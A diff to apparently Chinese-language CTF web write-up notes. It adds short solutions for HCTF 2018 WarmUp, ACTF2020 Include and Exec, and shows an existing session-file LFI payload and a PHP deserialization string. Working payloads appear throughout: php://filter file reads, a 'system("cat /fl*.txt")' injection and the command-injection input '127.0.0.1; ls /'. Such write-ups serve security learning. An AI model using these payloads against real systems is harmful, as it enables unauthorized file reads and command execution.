@@ -67,8 +67,7 @@ session文件包含，把可控内容写入session文件，LFI把这个session�
 
 ```
 <?php
-
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ?>',
+                                                                            ?>',
     '1':'localhost/tmp/sess_ctfshow',
     '2':'system("cat /fl*.txt");'
 }
@@ -540,6 +539,50 @@ class Flag{  //flag.php
 ```
 ?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 ```
+
+
+
+**[HCTF 2018]WarmUp**
+
+查看源码，提示`source.php`
+
+```php
+$_page = mb_substr(
+     $_page,
+     0,
+     mb_strpos($_page . '?', '?')
+);
+// 再次检查是否在白名单中
+if (in_array($_page, $whitelist)) {
+     return true;             // 在白名单里就通过
+}
+```
+
+截取?的内容看在白名单中就通过，之后就去读取文件内容
+
+
+
+**[ACTF2020 新生赛]Include 1**
+
+使用php协议读取文件
+
+```
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+
+
+**[ACTF2020 新生赛]Exec**
+
+能够执行ping命令，输入框的ip后加；后执行命令
+
+```
+127.0.0.1; ls /
+```
+
+
+
+
 
 
 
